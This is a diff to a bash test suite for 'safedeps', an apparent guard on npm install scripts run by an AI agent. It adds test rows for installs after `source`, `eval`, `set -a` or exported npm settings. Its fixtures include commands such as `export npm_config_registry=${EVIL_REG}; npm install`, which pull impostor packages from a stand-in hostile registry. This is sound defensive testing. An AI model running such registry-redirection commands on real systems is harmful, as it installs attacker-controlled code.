@@ -558,7 +558,7 @@ ROWS
 #     command spells out stays denied (RH4). RH5 is the control: the sandbox
 #     registry, named by SAFEDEPS_NPM_TEST_REGISTRY, is rebuilt as before. The
 #     rebuild used to run EVIL for RH1-RH3.
-#   P0-P7, P1x, PU: the impostor an earlier command fetched, met again by a
+#   P0-P7, P1x, EXP1: the impostor an earlier command fetched, met again by a
 #     later one once whatever fetched it is gone. Where bytes came from is a
 #     fact of that fetch, so the post hook records it by integrity in
 #     SAFEDEPS_HOME, machine-wide, and the whole-tree check looks it up. The
@@ -568,12 +568,13 @@ ROWS
 #     `npm install` after the .npmrc is removed (P2), `npm ci` from npm's cache
 #     (P3), a rollback to a snapshot confirmed with the impostor (P4, rolled
 #     back with nothing rebuilt), and another project's `npm ci` of the same
-#     lockfile with the same SAFEDEPS_HOME and cache (P5). An install after a
-#     `source` that npm could not be asked about is recorded too, under its
-#     reason (PU). A record on the public registry with no integrity cannot be
-#     matched and is not rebuilt (P7). The bytes leaving the tree releases it
-#     (P6), and P0 is two approved installs. The rebuild used to run EVIL for
-#     P1-P5, P1x, P7 and PU.
+#     lockfile with the same SAFEDEPS_HOME and cache (P5). An exported
+#     npm_config_registry is one-shot the same way (EXP1). A record on the
+#     public registry with no integrity cannot be matched and is not rebuilt
+#     (P7). The bytes leaving the tree releases it (P6), and P0 is two approved
+#     installs. The rebuild used to run EVIL for P1-P5, P1x and P7.
+#     An install after `source`, `.` or `eval` is not among them, on purpose:
+#     the SRC rows below.
 #   Q1-Q5: the same, where the first command fetched bytes a committed
 #     lockfile already named, so only the tree from before the command says
 #     what was already there. A clone with the impostor's integrity in its
@@ -799,7 +800,7 @@ new_p7() {
     edit_json "${f}" 'del(.packages[]?.integrity)'
   done
 }
-new_pu() { new_evilenvfile; withhold_first 'source ./npmenv.sh && npm install sd-approved@1.0.0'; }
+new_exp1() { new_project; withhold_first "export npm_config_registry=${EVIL_REG}; npm install sd-approved@1.0.0"; }
 new_q1() { new_evilclone; withhold_first 'npm ci'; rm -f "${CASE_PROJECT}/.npmrc"; }
 new_q2() { new_evilclone_bare; withhold_first "npm_config_registry=${EVIL_REG} npm ci"; }
 new_q3() { new_q2; rm -rf "${CASE_PROJECT}/node_modules"; }
@@ -874,9 +875,19 @@ new_dp1() {
 }
 # The UK rows: what an install npm cannot be asked about records. Its answer is
 # unknown, so it records every integrity a tree it has not observed holds,
-# public ones included (UK0: a tree installed outside the hooks, UK1: a clone),
-# and only what it brings in to a tree the hooks observed (UK2). The later
-# command installs the public sd-approved in another project.
+# public ones included (UK0a: a tree installed outside the hooks, UK1a: a
+# clone), and only what it brings in to a tree the hooks observed (UK2). The
+# later command installs the public sd-approved in another project. What
+# leaves npm's answer unknown here is a setting the gate reads but cannot
+# reproduce: `set -a` (UK0a, UK1a, UK2), `declare -x` (UK1d), an npm_config_*
+# assignment (UK1v), and `set -a` beside a `source` (MX1).
+#
+# Code the command runs first is the exception (UK0, UK1, and the SRC rows):
+# after `source`, `.` or `eval`, the install's scripts are withheld for that
+# command, but nothing is recorded and the tree is not left observed. That code
+# ran in the agent's shell and could already have run anything, so a record
+# would protect nothing, and UK0 and UK1 measured what it cost: every package
+# of the tree, public ones included, withheld on the whole machine.
 new_benignenv() { printf 'export SD_BENIGN=1\n' > "${CASE_PROJECT}/sdenv.sh"; }
 unknown_first() {
   local first_home
@@ -887,13 +898,50 @@ unknown_first() {
   new_project
   CASE_HOME="${first_home}"
 }
-new_uk0() { new_project; set_dependency sd-approved 1.0.0; fixture_install; unknown_first 'source ./sdenv.sh && npm install sd-swapped@1.0.0'; }
-new_uk1() { new_project; set_dependency sd-approved 1.0.0; fixture_install; rm -rf "${CASE_PROJECT}/node_modules"; unknown_first 'source ./sdenv.sh && npm ci'; }
+new_tree() { new_project; set_dependency sd-approved 1.0.0; fixture_install; }
+new_clone() { new_tree; rm -rf "${CASE_PROJECT}/node_modules"; }
+new_uk0() { new_tree; unknown_first 'source ./sdenv.sh && npm install sd-swapped@1.0.0'; }
+new_uk1() { new_clone; unknown_first 'source ./sdenv.sh && npm ci'; }
+new_uk0a() { new_tree; unknown_first 'set -a && npm install sd-swapped@1.0.0'; }
+new_uk1a() { new_clone; unknown_first 'set -a && npm ci'; }
+new_uk1d() { new_clone; unknown_first 'declare -x SD_BENIGN=1 && npm ci'; }
+new_uk1v() { new_clone; unknown_first 'npm_config_fund=false; npm ci'; }
+new_mx1() { new_clone; unknown_first 'set -a; source ./sdenv.sh && npm ci'; }
 new_uk2() {
   new_project; run_install 'npm install sd-approved@1.0.0'
   [[ -z "${CASE_POST}" ]] || fail "UK2's first install confirms quietly (post: ${CASE_POST:0:300})"
-  unknown_first 'source ./sdenv.sh && npm install sd-swapped@1.0.0'
+  unknown_first 'set -a && npm install sd-swapped@1.0.0'
 }
+
+# The SRC rows: <form> runs code from a file or an eval payload, then installs.
+# It is run here, as the row's first command, and must be kept with nothing
+# rebuilt, a warning that says why nothing was recorded, and the record of
+# withheld bytes and the observed tree hashes as they were. The row is the next
+# ordinary install in the same project, which npm answers for, and which
+# rebuilds the tree.
+SOURCED_SAYS="It has not recorded these bytes as withheld: that code ran in this shell and could already have run anything, so a record would protect nothing. The next install npm says fetches from the public npm registry rebuilds them as usual"
+home_records() { (cd "${CASE_HOME}" && find npm-withheld npm-observed -type f -exec cksum {} + 2>/dev/null | sort); }
+sourced_first() {
+  local id="$1" form="$2" before
+  new_benignenv
+  before=$(home_records)
+  run_install "${form}"
+  if [[ -n "${CASE_PRE_DENY}" || "${CASE_INSTALL_RC}" != 0 ]] || rolled_back; then
+    note_failure "${id}: the first command is let through and kept: ${form} (deny: ${CASE_PRE_DENY:0:160}, rc ${CASE_INSTALL_RC}, post: ${CASE_POST:0:300})"
+    return 0
+  fi
+  printf '%-4s %-7s %s | ran=[%s] post=[%s]\n' "${id}" first "${form}" \
+    "$(cut -f1,2 <<< "${CASE_RAN}" | tr '\t' ':' | paste -sd, -)" \
+    "$(jq -r '.systemMessage // empty' <<< "${CASE_POST}" 2>/dev/null | tr '\n' ' ' | head -c 300)"
+  [[ -z "${CASE_RAN}" ]] || note_failure "${id}: the first command rebuilds nothing (${CASE_RAN})"
+  grep -qF "${SOURCED_SAYS}" <<< "${CASE_POST}" \
+    || note_failure "${id}: the first command's warning says why nothing is recorded (post: ${CASE_POST:0:400})"
+  [[ "$(home_records)" == "${before}" ]] \
+    || note_failure "${id}: the first command records nothing withheld and leaves no tree observed ($(home_records | paste -sd' ' -))"
+}
+new_src1() { new_clone; sourced_first SRC1 'source ./sdenv.sh && npm ci'; }
+new_src2() { new_project; sourced_first SRC2 '. ./sdenv.sh && npm install sd-approved@1.0.0'; }
+new_src3() { new_clone; sourced_first SRC3 'eval "export SD_BENIGN=1" && npm ci'; }
 
 # <id>|<fixture>|<engine>|<expect>|<command>, where <expect> is
 #   fallback            rolled back with no confirmed snapshot, said in all three records
@@ -1031,7 +1079,7 @@ P4|p4|claude|held:${WITHHELD_EVIL}|npm install sd-victim
 P5|p5|claude|kept:${WITHHELD_EVIL}|npm ci
 P6|p6|claude|quiet:sd-approved|npm install sd-approved@1.0.0
 P7|p7|claude|kept:a package recorded on the public registry with no integrity, so safedeps cannot tell its bytes from ones it withheld (node_modules/sd-approved (sd-approved@1.0.0))|npm install sd-swapped@1.0.0
-PU|pu|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (source) can change the environment npm runs with|npm install sd-swapped@1.0.0
+EXP1|exp1|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
 Q1|q1|claude|kept:${WITHHELD_EVIL}|npm install
 Q2|q2|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
 Q3|q3|claude|kept:${WITHHELD_EVIL}|npm ci
@@ -1042,9 +1090,17 @@ HL2|hl2|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
 HL3|hl3|claude|kept:${WITHHELD_EVIL}|npm ci
 HL4|hl4|claude|kept:${WITHHELD_EVIL}|npm ci
 DP1|dp1|claude|kept:${WITHHELD_EVIL}|npm install
-UK0|uk0|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (source) can change the environment npm runs with|npm install sd-approved@1.0.0
-UK1|uk1|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (source) can change the environment npm runs with|npm install sd-approved@1.0.0
+UK0|uk0|claude|quiet:sd-approved|npm install sd-approved@1.0.0
+UK1|uk1|claude|quiet:sd-approved|npm install sd-approved@1.0.0
+UK0a|uk0a|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (set -a) can change the environment npm runs with|npm install sd-approved@1.0.0
+UK1a|uk1a|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (set -a) can change the environment npm runs with|npm install sd-approved@1.0.0
+UK1d|uk1d|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (declare -x) can change the environment npm runs with|npm install sd-approved@1.0.0
+UK1v|uk1v|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (npm_config_fund=) can change the environment npm runs with|npm install sd-approved@1.0.0
+MX1|mx1|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (set -a) can change the environment npm runs with|npm install sd-approved@1.0.0
 UK2|uk2|claude|quiet:sd-approved|npm install sd-approved@1.0.0
+SRC1|src1|claude|quiet:sd-approved|npm install sd-approved@1.0.0
+SRC2|src2|claude|quiet:sd-approved|npm install sd-approved@1.0.0
+SRC3|src3|claude|quiet:sd-approved|npm install sd-approved@1.0.0
 ROWS
 [[ ${#FAILURES[@]} -ne ${failures_before} ]] \
   || pass "install scripts run only over a tree on record from the public registry or a workspace, a package counts as bundled only where its parent's package.json bundles it, a record on the public registry counts only where npm says it fetched from there, a rollback runs none without a confirmed snapshot and says what ran on each engine, and K4-K7 are installed but not rebuilt"
